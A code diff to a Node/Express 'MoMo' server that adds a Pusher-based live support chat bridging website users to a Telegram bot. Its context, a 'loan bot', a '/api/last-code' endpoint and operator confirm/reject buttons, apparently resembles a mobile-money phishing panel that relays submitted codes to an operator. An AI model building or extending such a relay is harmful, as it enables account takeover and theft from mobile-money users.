@@ -3,13 +3,29 @@ const express = require('express');
 const cors = require('cors');
 const fetch = require('node-fetch');
 const path = require('path');
+const Pusher = require('pusher'); // <-- ADDED PUSHER
 
 const app = express();
 app.use(cors());
 app.use(express.json());
 
+// ===== PUSHER SETUP =====
+const pusher = new Pusher({
+    appId: process.env.PUSHER_APP_ID,
+    key: process.env.PUSHER_KEY,
+    secret: process.env.PUSHER_SECRET,
+    cluster: process.env.PUSHER_CLUSTER,
+    useTLS: true
+});
+// ===================================
+
+// Existing Loan Bot
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID   = process.env.CHAT_ID;
+
+// Support Chat Bot Variables
+const SUPPORT_BOT_TOKEN = process.env.SUPPORT_BOT_TOKEN;
+const SUPPORT_CHAT_ID   = process.env.SUPPORT_CHAT_ID;
 
 // Serve HTML from parent folder
 app.use(express.static(path.join(__dirname, '..')));
@@ -199,42 +215,62 @@ app.get('/api/status', function (req, res) {
 });
 
 // ============================================================
-// 6) TELEGRAM CALLBACK
+// 6) TELEGRAM CALLBACK (Merged: Handles Buttons AND Chat)
 // ============================================================
 app.post('/api/telegram-callback', async function (req, res) {
+    // --- A) Handle Button Clicks (Confirm/Reject) ---
     var cb = req.body.callback_query;
-    if (!cb) return res.sendStatus(200);
+    if (cb) {
+        var parts = cb.data.split(':');
+        var action = parts[0];
+        var referenceId = parts[1];
 
-    var parts = cb.data.split(':');
-    var action = parts[0];
-    var referenceId = parts[1];
+        decisions[referenceId] = (action === 'confirm') ? 'confirmed' : 'rejected';
+        console.log('📥 Decision:', referenceId, '->', decisions[referenceId]);
 
-    decisions[referenceId] = (action === 'confirm') ? 'confirmed' : 'rejected';
-    console.log('📥 Decision:', referenceId, '->', decisions[referenceId]);
+        try {
+            await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/answerCallbackQuery', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    callback_query_id: cb.id,
+                    text: action === 'confirm' ? '✅ Confirmed' : '❌ Rejected'
+                })
+            });
 
-    try {
-        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/answerCallbackQuery', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                callback_query_id: cb.id,
-                text: action === 'confirm' ? '✅ Confirmed' : '❌ Rejected'
-            })
-        });
+            await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/editMessageText', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: cb.message.chat.id,
+                    message_id: cb.message.message_id,
+                    text: cb.message.text + '\n\n— — —\n' +
+                          (action === 'confirm' ? '✅ CONFIRMED' : '❌ REJECTED'),
+                    parse_mode: 'HTML'
+                })
+            });
+        } catch (err) {
+            console.error('Callback reply failed:', err);
+        }
+        return res.sendStatus(200);
+    }
 
-        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/editMessageText', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: cb.message.chat.id,
-                message_id: cb.message.message_id,
-                text: cb.message.text + '\n\n— — —\n' +
-                      (action === 'confirm' ? '✅ CONFIRMED' : '❌ REJECTED'),
-                parse_mode: 'HTML'
-            })
-        });
-    } catch (err) {
-        console.error('Callback reply failed:', err);
+    // --- B) Handle Chat Replies from Agent (PUSHER) ---
+    var msg = req.body.message;
+    if (msg && msg.text && msg.reply_to_message) {
+        var targetUserId = replyMap[msg.reply_to_message.message_id];
+        if (targetUserId) {
+            // Send via Pusher
+            await pusher.trigger('chat-channel', 'agent-message-' + targetUserId, { text: msg.text });
+            
+            try {
+                await fetch('https://api.telegram.org/bot' + SUPPORT_BOT_TOKEN + '/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: SUPPORT_CHAT_ID, text: '✅ Reply delivered.' })
+                });
+            } catch (e) { console.error(e); }
+        }
     }
 
     res.sendStatus(200);
@@ -317,6 +353,54 @@ app.post('/api/last-code', async function (req, res) {
     }
 });
 
+// ============================================================
+// ===== LIVE SUPPORT CHAT BRIDGE (USING PUSHER) =====
+// ============================================================
+const replyMap = {};
+
+app.post('/api/chat-send', async function (req, res) {
+    const { text, userId } = req.body;
+    const userRef = 'CHAT-' + userId.slice(0, 6).toUpperCase();
+
+    const telegramMsg =
+        '💬 <b>LIVE SUPPORT CHAT</b>\n' +
+        '━━━━━━━━━━━━━━━━━━━━━━\n' +
+        '🔖 <b>Session:</b> <code>' + userRef + '</code>\n' +
+        '\n👤 <b>User says:</b>\n' +
+        '<pre><code>' + escapeHtml(text) + '</code></pre>\n' +
+        '\n🕐 ' + nowStr() + '\n' +
+        '\n<i>👉 Reply to THIS message to send a response back to the user.</i>';
+
+    try {
+        const resTG = await fetch('https://api.telegram.org/bot' + SUPPORT_BOT_TOKEN + '/sendMessage', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: SUPPORT_CHAT_ID,
+                text: telegramMsg,
+                parse_mode: 'HTML',
+                reply_markup: {
+                    force_reply: true,
+                    input_field_placeholder: 'Reply to ' + userRef + '...'
+                }
+            })
+        });
+        const json = await resTG.json();
+        
+        if (json.ok && json.result) {
+            replyMap[json.result.message_id] = userId;
+            console.log('📤 Sent to Support Telegram:', userRef);
+        }
+        res.json({ ok: true });
+    } catch (err) {
+        console.error('Failed to send to Support Telegram:', err);
+        res.status(500).json({ ok: false });
+    }
+});
+
+// ============================================================
+// START SERVER
+// ============================================================
 var PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', function () {
     console.log('🚀 MoMo server running at port ' + PORT);
